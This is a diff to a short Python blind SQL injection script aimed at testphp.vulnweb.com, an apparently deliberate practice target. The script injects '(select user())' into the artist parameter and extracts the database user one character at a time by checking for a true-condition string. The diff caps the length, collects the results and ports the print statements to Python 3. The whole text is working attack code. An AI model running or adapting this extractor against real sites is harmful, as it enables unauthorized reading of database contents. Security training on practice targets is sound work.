@@ -7,8 +7,8 @@ import re
 url = 'http://testphp.vulnweb.com/artists.php?artist=2' # target
 payload = '(select user())'; # your payload
 trueString = 'Blad3' # Text or html in the true condition
-maxLength = 20
-
+maxLength = 10
+result = ''
 for i in range(1, maxLength + 1):
     for j in range(32, 127):
         if(chr(j).isupper()):
@@ -23,6 +23,9 @@ for i in range(1, maxLength + 1):
 
         try:
             re.search(r'(.*)'+trueString+'(.*?) .*', html, flags=re.DOTALL).group(1)
-            print chr(j),
+            print ('Found: ' + chr(j))
+            result += chr(j)
         except:
             pass
+
+print (result)
